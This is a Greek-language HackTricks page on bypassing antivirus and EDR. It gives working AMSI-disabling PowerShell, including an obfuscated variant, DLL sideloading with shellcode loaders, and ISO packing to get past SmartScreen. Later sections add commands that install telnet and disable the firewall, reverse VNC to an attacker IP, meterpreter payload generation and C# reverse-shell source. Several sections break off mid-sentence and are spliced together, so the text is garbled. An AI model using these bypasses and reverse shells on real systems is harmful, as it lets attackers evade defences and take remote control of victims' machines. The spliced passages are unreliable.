# Απόφυγη Αντιικών (AV Bypass)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

**Αυτή η σελίδα έχει γραφτεί από τον** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**!**

## **Μεθοδολογία Αποφυγής Αντιικών (AV Evasion)**

Αυτή τη στιγμή, τα Αντιικά χρησιμοποιούν διάφορες μεθόδους για να ελέγξουν εάν ένα αρχείο είναι κακόβουλο ή όχι, στατική ανίχνευση, δυναμική ανάλυση και για τα πιο προηγμένα EDRs, συμπεριφερόμενη ανάλυση.

### **Στατική ανίχνευση**

Η στατική ανίχνευση επιτυγχάνεται με το να εντοπίζονται γνωστές κακόβουλες συμβολοσειρές ή σειρές bytes σε ένα δυαδικό ή σενάριο, καθώς και με την εξαγωγή πληροφοριών από το ίδιο το αρχείο (π.χ. περιγραφή αρχείου, όνομα εταιρείας, ψηφιακές υπογραφές, εικονίδιο, checksum, κλπ.). Αυτό σημαίνει ότι η χρήση γνωστών δημόσιων εργαλείων μπορεί να σας πιάσει πιο εύκολα, καθώς πιθανόν έχουν αναλυθεί και έχουν επισημανθεί ως κακόβουλα. Υπάρχουν μερικοί τρόποι για να παρακάμψετε αυτήν την ανίχνευση:

* **Κρυπτογράφηση**

Εάν κρυπτογραφήσετε το δυαδικό, δεν θα υπάρχει τρόπος για το AV να ανιχνεύσει το πρόγραμμά σας, αλλά θα χρειαστείτε κάποιον τύπο φορτωτή για να αποκρυπτογραφήσετε και να εκτελέσετε το πρόγραμμα στη μνήμη.

* **Απόκρυψη**

Μερικές φορές, όλο όσο χρειάζεται να κάνετε είναι να αλλάξετε μερικές συμβολοσειρές στο δυαδικό ή στο σενάριο σας για να το περάσετε από το AV, αλλά αυτό μπορεί να είναι μια χρονοβόρα διαδικασία ανάλογα με αυτό που προσπαθείτε να αποκρύψετε.

* **Προσαρμοσμένα εργαλεία**

Εάν αναπτύξετε τα δικά σας εργαλεία, δεν θα υπάρχουν γνωστές κακές υπογραφές, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.

{% hint style="info" %}
Ένας καλός τρόπος για να ελέγξετε εάν ένας στατικός ανιχνευτής του Windows Defender εντοπίζει κάτι είναι το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Βασικά χωρίζει το αρχείο σε πολλά τμήματα και στη συνέχεια ζητά από τον Defender να ελέγξει καθένα ξεχωριστά, έτσι μπορεί να σας πει ακριβώς ποιες είναι οι εντοπισμένες συμβολοσειρές ή bytes στο δυαδικό σας.
{% endhint %}

Συνιστώ ανεπιφύλακτα να ελέγξετε αυτήν την [λίστα αναπαραγωγή
## DLL Sideloading & Proxying

Η **Παράκαμψη DLL** εκμεταλλεύεται τη σειρά αναζήτησης DLL που χρησιμοποιείται από τον φορτωτή τοποθετώντας τη θύμα εφαρμογή και το κακόβουλο φορτίο δίπλα-δίπλα.

Μπορείτε να ελέγξετε για προγράμματα ευάλωτα στην Παράκαμψη DLL χρησιμοποιώντας το [Siofra](https://github.com/Cybereason/siofra) και το παρακάτω script powershell:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

Αυτή η εντολή θα εμφανίσει τη λίστα των προγραμμάτων που είναι ευάλωτα στην επίθεση DLL hijacking μέσα στον φάκελο "C:\Program Files\\" και τα αρχεία DLL που προσπαθούν να φορτώσουν.

Συνιστώ ανεπιφύλακτα να **εξερευνήσετε μόνοι σας τα προγράμματα που είναι ευάλωτα στην επίθεση DLL Hijack**, αυτή η τεχνική είναι αρκετά αόρατη όταν γίνεται σωστά, αλλά αν χρησιμοποιήσετε γνωστά δημόσια προγράμματα που είναι ευάλωτα στην επίθεση DLL Sideload, μπορεί να σας πιάσουν εύκολα.

Απλά τοποθετώντας ένα κακόβουλο DLL με το όνομα που αναμένει να φορτώσει ένα πρόγραμμα, δεν θα φορτώσει το payload σας, καθώς το πρόγραμμα αναμένει κάποιες συγκεκριμένες λειτουργίες μέσα σε αυτό το DLL. Για να λύσουμε αυτό το πρόβλημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

Το **DLL Proxying** προωθεί τις κλήσεις που ένα πρόγραμμα κάνει από το προξενιό (και κακόβουλο) DLL στο αρχικό DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας την εκτέλεση του payload σας.

Για αυτό θα χρησιμοποιήσω το έργο [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) από τον [@flangvik](https://twitter.com/Flangvik/)

Αυτά είναι τα βήματα που ακολούθησα:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο κώδικα πηγής DLL και το αρχικό DLL που έχει μετονομαστεί.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

Αυτά είναι τα αποτελέσματα:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Τόσο το shellcode μας (κωδικοποιημένο με το [SGN](https://github.com/EgeBalci/sgn)) όσο και το προξενούμενο DLL έχουν ανίχνευση 0/26 στο [antiscan.me](https://antiscan.me)! Θα το ονόμαζα επιτυχία.

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Συνιστώ **ανεπιφύλακτα** να παρακολουθήσετε το [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) για το DLL Sideloading και επίσης το [βίντεο του ippsec](https://www.youtube.com/watch?v=3eROsG\_WNpE) για να μάθετε περισσότερα για αυτό που συζητήσαμε αναλυτικά.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Το Freeze είναι ένα εργαλείο πληρωμής για την απόφυγη των EDRs χρησιμοποιώντας ανασταλμένες διεργασίες, άμεσες κλήσεις συστήματος και εναλλακτικές μεθόδους εκτέλεσης`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με έναν αθόρυβο τρόπο.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Η αποφυγή είναι ένα παιχνίδι γάτας και ποντικιού, αυτό που λειτουργεί σήμερα μπορεί να ανιχνευθεί αύριο, οπότε μην βασίζεστε ποτέ μόνο σε ένα εργαλείο, αν είναι δυνατόν, δοκιμάστε να συνδέσετε πολλές τεχνικές αποφυγής.
{% endhint %}

## AMSI (Διεπαφή Σάρωσης Αντι-Κακόβουλου Λογισμικού)

Το AMSI δημιουργήθηκε για να αποτρέψει το "[fileless malware](https://en.wikipedia.org/wiki/Fileless\_malware)". Αρχικά, οι AVs ήταν ικανοί μόνο να σαρώνουν **αρχεία στον δίσκο**, οπότε αν μπορούσατε κάπως να εκτελέσετε payloads **απευθείας στη μνήμη**, ο AV δεν θα μπορούσε να κάνει τίποτα για να το αποτρέψει, καθώς δεν είχε αρκετή ορατότητα.

Η δυνατότητα AMSI ενσωματώνεται σε αυτά τα στοιχεία των Windows.

* User Account Control, ή UAC (ανύψωση του EXE, COM, MSI ή εγκατάστασης ActiveX)
* PowerShell (σενάρια, διαδραστική χρήση και δυναμική αξιολόγηση κώδικα)
* Windows Script Host (wscript.exe και cscript.exe)
* JavaScript και VBScript
* Μακροεντολές Office VBA

Επιτρέπει στις λύσεις αντιιούσας να επιθεωρούν τη συμπεριφορά του σεναρίου αποκαλύπτοντας τα περιεχόμενα του σε μια μορφή που είναι και μη κρυπτογραφημένη και μη αποκωδικοποιημένη.

Η εκτέλεση της εντολής `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα παράγει τον παρακάτω κίνδυνο στον Windows Defender.

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

Παρατηρήστε πώς προσθέτει το `amsi:` και στη συνέχεια το μονοπάτι του εκτελέσιμου από το οποίο εκτελέστηκε το σενάριο, σε αυτήν την περίπτωση το powershell.exe

Δεν αποθηκεύσαμε κανένα αρχείο στον δίσκο, αλλά παρ' όλα αυτά ανιχνεύτηκε στη μνήμη λόγω του AMSI.

Υπάρχουν μερικοί τρόποι για να παρακάμψετε το AMSI:

* **Απόκρυψη**

Επειδή το AMSI λειτουργεί κυρίως με στατικές ανιχνεύσεις, η τροποποίηση των σεναρίων που προσπαθείτε να φορτώσετε μπορεί να είναι ένας καλός τρόπος για να αποφύγετε την ανίχνευση.

Ωστόσο, το AMSI έχει τη δυνατότητα να αποκωδικοποιεί σενάρια ακόμα κι αν έχουν πολλά επίπεδα, οπότε η απόκρυψη μπορεί να είναι μια κακή επιλογή ανάλογα με το πώς γίνεται. Αυτό καθιστά την αποφυγή μη-απλής. Ωστόσο, μερικές φορές, αρκεί να αλλάξετε μερικά ονόματα μεταβλητών και θα είστε καλά, οπότε εξαρτάται από το πόσο κάτι έχει σημανθεί.

* **Παράκαμψη AMSI**

Επειδή το AMSI εφαρμόζεται φορτώνοντας ένα DLL στη διαδικασία powershell (επίσης cscript.exe, wscript.exe, κλπ.), είναι δυνατό να το παραβιάσετε εύκολα ακόμα και ως μη προνομιούχος χρήστης. Λόγω αυτής της ελλάτωσης στην υλοποίηση του AMSI, οι ερευνητές έχουν βρει πολλούς τρόπους για να αποφύγουν τη σάρωση AMSI.

**Εξαναγκασμός Σφάλματος**

Ο εξαναγκασμός της αρχικοποίησης του AMSI να αποτύχει (amsiInitFailed) θα έχει ως αποτέλεσμα να μην ξεκινηθεί καμία σάρωση για την τρέχουσα διεργασία. Αρχικά αυτό αποκαλύφθηκε από τον [Matt Graeber](https://twitter.com/mattifestation) και η Microsoft έχει αναπτύξει μια υπογραφή για να αποτρέψει την ευρύτερη χρήση.

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

Αρκούσε μόνο μία γραμμή κώδικα powershell για να καταστήσει το AMSI ανενεργό για την τρέχουσα διεργασία powershell. Αυτή η γραμμή φυσικά έχει εντοπιστεί από το ίδιο το AMSI, οπότε απαιτείται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.

Εδώ υπάρχει μια τροποποιημένη παράκαμψη του AMSI που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**Επισημάνετε ότι αυτό πιθανόν θα εντοπιστεί μόλις δημοσιευθεί αυτή η ανάρτηση, οπότε δεν πρέπει να δημοσιεύσετε κανέναν κώδικα αν θέλετε να παραμείνετε ανεντοπίστους.**

**Τροποποίηση μνήμης**

Αυτή η τεχνική ανακαλύφθηκε αρχικά από τον [@RastaMouse](https://twitter.com/\_RastaMouse/) και περιλαμβάνει την εύρεση της διεύθυνσης για τη λειτουργία "AmsiScanBuffer" στο αρχείο amsi.dll (υπεύθυνη για τη σάρωση της εισόδου που παρέχεται από τον χρήστη) και την αντικατάστασή της με οδηγίες για να επιστρέψει τον κώδικα για το E\_INVALIDARG, με αυτόν τον τρόπο το αποτέλεσμα της πραγματικής σάρωσης θα επιστραφεί 0, το οποίο ερμηνεύεται ως ένα καθαρό αποτέλεσμα.

{% hint style="info" %}
Παρακαλούμε διαβάστε [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για μια πιο λεπτομερή εξήγηση.
{% endhint %}

Υπάρχουν επίσης πολλές άλλες τεχνικές που χρησιμοποιούνται για την παράκαμψη του AMSI με τη χρήση του powershell, ελέγξτε [**αυτήν τη σελίδα**](basic-powershell-for-pentesters/#amsi-bypass) και [αυτό το αποθετήριο](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) για να μάθετε περισσότερα για αυτές.

Ή αυτό το σενάριο που μέσω της τροποποίησης της μνήμης θα τροποποιήσει κάθε νέο Powersh

## Απόκρυψη

Υπάρχουν αρκετά εργαλεία που μπορούν να χρησιμοποιηθούν για την **απόκρυψη του καθαρού κειμένου του C# κώδικα**, τη δημιουργία **προτύπων μεταπρογραμματισμού** για τη συγγραφή δυαδικών αρχείων ή την **απόκρυψη των δυαδικών αρχείων που έχουν συγγραφεί**:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: Απόκρυψη C#**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ο στόχος αυτού του έργου είναι να παρέχει μια ανεξάρτητη ανοικτού κώδικα έκδοση του συνόλου εργαλείων μεταγλώττισης [LLVM](http://www.llvm.org/) που μπορεί να παρέχει αυξημένη ασφάλεια λογισμικού μέσω [απόκρυψης κώδικα](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) και προστασίας από παρεμβολές.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): Το ADVobfuscator δείχνει πώς να χρησιμοποιήσετε τη γλώσσα `C++11/14` για να δημιουργήσετε, κατά τη διάρκεια της μεταγλώττισης, αποκρυπτογραφημένο κώδικα χωρίς τη χρήση εξωτερικού εργαλείου και χωρίς τροποποίηση του μεταγλωττιστή.
* [**obfy**](https://github.com/fritzone/obfy): Προσθέστε ένα επίπεδο αποκρυπτογραφημένων λειτουργιών που δημιουργούνται από το πλαίσιο μεταπρογραμματισμού προτύπων C++, το οποίο θα δυσκολέψει λίγο τη ζωή του ατόμου που θέλει να σπάσει την εφαρμογή.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Το Alcatraz είναι ένας obfuscator δυαδικών αρχείων x64 που μπορεί να αποκρύψει διάφορα διαφορετικά αρχεία pe, συμπεριλαμβανομένων: .exe, .dll, .sys
* [**metame**](https://github.com/a0rtega/metame): Το Metame είναι ένα απλό μηχανισμό μεταμορφωτικού κώδικα για αυθαίρετα εκτελέσιμα αρχεία.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα πλαίσιο απόκρυψης κώδικα με λεπτομερή έλεγχο για γλώσσες που υποστηρίζονται από το LLVM χρησιμοποιώντας ROP (return-oriented programming). Το ROPfuscator αποκρύπτει ένα πρόγραμμα στο επίπεδο του κώδικα συναρμολόγησης μετατρέποντας τις κανονικές οδηγίες σε αλυσίδες ROP, αντιτίθεται στη φυσική μας αντίληψη της κανονικής ροής ελέγχου.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Το Nimcrypt είναι ένας κρυπτογράφος .NET PE που έχει γραφεί σε Nim
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Το Inceptor μπορεί να μετατρέψει υπάρχοντα EXE/DLL σε κώδικα κατακερματισμού και στη συνέχεια να τα φορτώσει

## SmartScreen & MoTW

Μπορεί να έχετε δει αυτήν την οθόνη κατά τη λήψη ορισμένων εκτελέσιμων αρχείων από το διαδίκτυο και την εκτέλεσή τους.

Το Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφαλείας που έχει σκοπό να προστατεύσει τον τελικό χρήστη από την εκτέλεση πιθανώς κακόβουλων εφαρμογών.

<figure><img src="../.gitbook/assets/image (1) (
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Εδώ υπάρχει μια επίδειξη για την απόφυγη του SmartScreen με τη συσκευασία φορτίων μέσα σε αρχεία ISO χρησιμοποιώντας το [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## Αντανάκλαση Συναρμολόγησης C#

Η φόρτωση δυαδικών αρχείων C# στη μνήμη είναι γνωστή εδώ και αρκετό καιρό και εξακολουθεί να είναι ένας πολύ καλός τρόπος για την εκτέλεση των εργαλείων μετά την εκμετάλλευση χωρίς να ανιχνεύεται από το AV.

Εφόσον το φορτίο θα φορτωθεί απευθείας στη μνήμη χωρίς να αγγίζει τον δίσκο, θα πρέπει να ανησυχούμε μόνο για την τροποποίηση του AMSI για ολόκληρη τη διαδικασία.

Οι περισσότεροι πλαισίων C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, κλπ) παρέχουν ήδη τη δυνατότητα εκτέλεσης δυαδικών αρχείων C# απευθείας στη μνήμη, αλλά υπάρχουν διάφοροι τρόποι για να το κάνετε:

* **Παρακλάδωση και Εκτέλεση**

Αυτό περιλαμβάνει τη **δημιουργία ενός νέου διεργασίας-θυσίας**, ενσωματώνοντας το κακόβουλο κώδικα μετά την εκμετάλλευση σε αυτήν τη νέα διεργασία, εκτελώντας τον κακόβουλο κώδικα και όταν τελειώσει, σκοτώνοντας τη νέα διεργασία. Αυτό έχει τα πλεονεκτήματα και τα μειονεκτήματά του. Το πλεονέκτημα της μεθόδου παρακλάδωσης και εκτέλεσης είναι ότι η εκτέλεση γίνεται **εκτός** της διεργασίας του εμφυτεύματος Beacon. Αυτό σημαίνει ότι αν κάτι πάει στραβά ή ανιχνευθεί κατά τη διάρκεια της μετά-εκμετάλλευσης, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να επιβιώσει το **εμφύτευμα** μας. Το μειονέκτημα είναι ότι έχετε **μεγαλύτερη πιθανότητα** να ανιχνευθείτε από **Συμπεριφορικές Ανιχνεύσεις**.

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Ενσωμάτωση**

Πρόκειται για την ενσωμάτωση του κακόβουλου κώδικα μετά την εκμετάλλευση **στην ίδια τη διεργασία**. Με αυτόν τον τρόπο, μπορείτε να αποφύγετε τη δημιουργία μιας νέας διεργασίας και την ανίχνευσή της από το AV, αλλά το μειονέκτημα είναι ότι αν κάτι πάει στραβά με την εκτέλεση του φορτίου, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon** σας καθώς μπορεί να καταρρεύσει.

<figure><img src="../.gitbook/assets/image (9) (3) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Αν θέλετε να διαβάσετε περισσότερα για τη φόρτωση δυαδικών αρχείων C#, παρακαλούμε ελέγξτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF τους ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

Μπορείτε επίσης να φορτώσετε δυαδικά αρχεία C# **από το PowerShell**, δείτε το [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το βίντεο του [S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Χρήση άλλων γλωσσών προγραμματισμού

Όπως προτάθηκε στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατόν να εκτελεστεί κακόβουλος κώδικας χρησιμοποιώντας άλλες γλώσσες προγραμματισμού δίνοντας στην παραβιασμένη μηχανή πρόσβαση **στο περιβάλλον ερμηνευτή που είναι εγκατεστημένο στον ελεγχόμενο SMB κοινόχρηστο χώρο**.

Επιτρέποντας την πρόσβαση στα δυαδικά αρχεία του ερμηνευτή και το περιβάλλον στον κοινόχρηστο χώρο SMB, μπορείτε να **εκτελέσετε αυθαίρετο κώδικα σε αυτές τις γλώσσες μέσα στη μνήμη** της παραβιασμένης μηχανής.

Το αποθετήριο δείχνει: Ο Defender εξακολουθεί να σαρώνει τα σενάρια, αλλά χρησιμοποιώντας Go, Java, PHP κ.λπ. έχουμε **μεγαλύτερη ευελιξία για την απόφυγη στατικών υπογραφών**. Ο έλεγχος με τυχαία μη αποκωδικοποιημένα αντίστροφα κέλυφα σε αυτές τις γλώσσες έχει αποδειχθεί επιτυχής.

## Προηγμένη Αποφυγή

Η αποφυγή είναι ένα πολύπλοκο θέμα, μερικές φορές πρέπει να λάβετε υπόψη πολλές διαφορετικές πηγές τηλεμετρίας σε ένα σύστημα, επομένως είναι σχεδόν αδύνατο να παραμείνετε εντελώς ανεντοπίσ
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Κάντε το **ξεκίνημα** όταν ξεκινάει το σύστημα και **εκτελέστε** το τώρα:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Αλλαγή της θύρας του telnet** (stealth) και απενεργοποίηση του τείχους προστασίας (firewall):

```plaintext
Για να αλλάξετε τη θύρα του telnet και να το καταστήσετε αόρατο (stealth), ακολουθήστε τα παρακάτω βήματα:

1. Ανοίξτε το αρχείο ρυθμίσεων του telnet (τυπικά το αρχείο `telnetd.conf`).
2. Βρείτε τη γραμμή που αναφέρεται στη θύρα του telnet (τυπικά `port = 23`) και αλλάξτε την σε μια διαφορετική θύρα της επιλογής σας.
3. Αποθηκεύστε τις αλλαγές και κλείστε το αρχείο.

Για να απενεργοποιήσετε το τείχος προστασίας (firewall), ακολουθήστε τα παρακάτω βήματα:

1. Ανοίξτε τις ρυθμίσεις του τείχους προστασίας του συστήματος σας.
2. Απενεργοποιήστε το τείχος προστασίας ή αφαιρέστε τους κανόνες που απαγορεύουν την πρόσβαση στη θύρα του telnet.
3. Αποθηκεύστε τις αλλαγές και κλείστε τις ρυθμίσεις.

Με αυτές τις ενέργειες, θα έχετε αλλάξει τη θύρα του telnet και θα έχετε απενεργοποιήσει το τείχος προστασίας, καθιστώντας το telnet αόρατο και προσβάσιμο από άλλους χρήστες.
```
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (θέλετε τις bin εκδόσεις, όχι την εγκατάσταση)

**ΣΤΟΝ ΚΕΝΤΡΙΚΟ ΥΠΟΛΟΓΙΣΤΗ**: Εκτελέστε το _**winvnc.exe**_ και ρυθμίστε τον διακομιστή:

* Ενεργοποιήστε την επιλογή _Disable TrayIcon_
* Ορίστε έναν κωδικό πρόσβασης στο _VNC Password_
* Ορίστε έναν κωδικό πρόσβασης στο _View-Only Password_

Στη συνέχεια, μετακινήστε το δυαδικό _**winvnc.exe**_ και το **νεοδημιουργημένο** αρχείο _**UltraVNC.ini**_ μέσα στον **θύμα**.

#### **Αντίστροφη σύνδεση**

Ο **επιτιθέμενος** πρέπει να **εκτελέσει μέσα** στον **κεντρικό του υπολογιστή** το δυαδικό `vncviewer.exe -listen 5900` έτσι ώστε να είναι **έτοιμος** να αποδεχτεί μια αντίστροφη **σύνδεση VNC**. Στη συνέχεια, μέσα στον **θύμα**: Ξεκινήστε τον δαίμονα winvnc `winvnc.exe -run` και εκτελέστε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ΠΡΟΕΙΔΟΠΟΙΗΣΗ:** Για να διατηρήσετε την αόρατη λειτουργία, πρέπει να μην κάνετε μερικά πράγματα

* Μην ξεκινάτε το `winvnc` αν ήδη εκτελείται, διαφορετικά θα ενεργοποιήσετε ένα [αναδυόμενο παράθυρο](https://i.imgur.com/1SROTTl.png). Ελέγξτε αν εκτελείται με την εντολή `tasklist | findstr winvnc`
* Μην ξεκινάτε το `winvnc` χωρίς το `UltraVNC.ini` στον ίδιο φάκελο, διαφορετικά θα ανοίξει [το παράθυρο ρυθμίσεων](https://i.imgur.com/rfMQWcf.png)
* Μην εκτελείτε την εντολή `winvnc -h` για βοήθεια, διαφορετικά θα ενεργοποιήσετε ένα [αναδυόμενο παράθυρο](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Μέσα στο GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Τώρα **ξεκινήστε τον lister** με την εντολή `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Ο τρέχων ανιχνευτής θα τερματίσει τη διαδικασία πολύ γρήγορα.**

### Συγγραφή του δικού μας αντίστροφου κελύφους

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Πρώτο C# αντίστροφο κελύφους

Μεταγλωττίστε το με:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Χρησιμοποιήστε το με:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
